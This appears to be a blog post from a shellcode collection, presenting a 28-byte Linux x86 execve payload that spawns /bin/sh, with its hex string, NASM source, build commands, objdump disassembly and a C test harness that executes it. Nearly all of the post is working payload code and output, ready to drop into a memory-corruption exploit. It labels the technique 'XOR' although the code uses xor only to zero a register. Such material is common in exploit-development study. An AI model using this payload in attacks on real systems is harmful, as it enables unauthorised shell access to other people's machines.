---
title:  Linux/86 execve -> Stack,XOR
date: 2022-06-03 05:49:33 +0800
categories: [Shellcodes, Linux]
tags: []  
---

# Info

Description: `Shellcode to spawn /bin/sh`

Platform: `Linux`

Arch: `x86`

Size: `28 bytes`

Technique: `Stack`, `XOR`

Shellcode : `\x31\xc0\x50\x8d\x14\x24\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80`

# Execution

![shellcode](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/shellcodes/2022-02-01-l86hellosstackxor.png)

# Assembly-nasm

`nasm -f elf32 -o shellcode.o shellcode.asm`

`ld -o shellcode shellcode.o`

```nasm

global _start

section .text

_start:

    xor eax, eax

    push eax
    lea edx, [esp]

    ;//bin/sh
    
    push 0x68732f6e
    push 0x69622f2f
    lea ebx, [esp]

    push eax
    push ebx
    lea ecx, [esp]

    mov al,0xb
    int 0x80

```
# objdump

`objdump -d ./shellcode -M intel`

```bash

./shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    eax,eax
 8048062:       50                      push   eax
 8048063:       8d 14 24                lea    edx,[esp]
 8048066:       68 6e 2f 73 68          push   0x68732f6e
 804806b:       68 2f 2f 62 69          push   0x69622f2f
 8048070:       8d 1c 24                lea    ebx,[esp]
 8048073:       50                      push   eax
 8048074:       53                      push   ebx
 8048075:       8d 0c 24                lea    ecx,[esp]
 8048078:       b0 0b                   mov    al,0xb
 804807a:       cd 80                   int    0x80


```

# C

`gcc -o shellcode shellcode.c`

```c

#include <stdio.h>
#include <string.h>

char *shellcode =  "\x31\xc0\x50\x8d\x14\x24\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x1c\x24\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80";
int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(shellcode));
        (*(void(*)()) shellcode)();
        return 0;
}

```

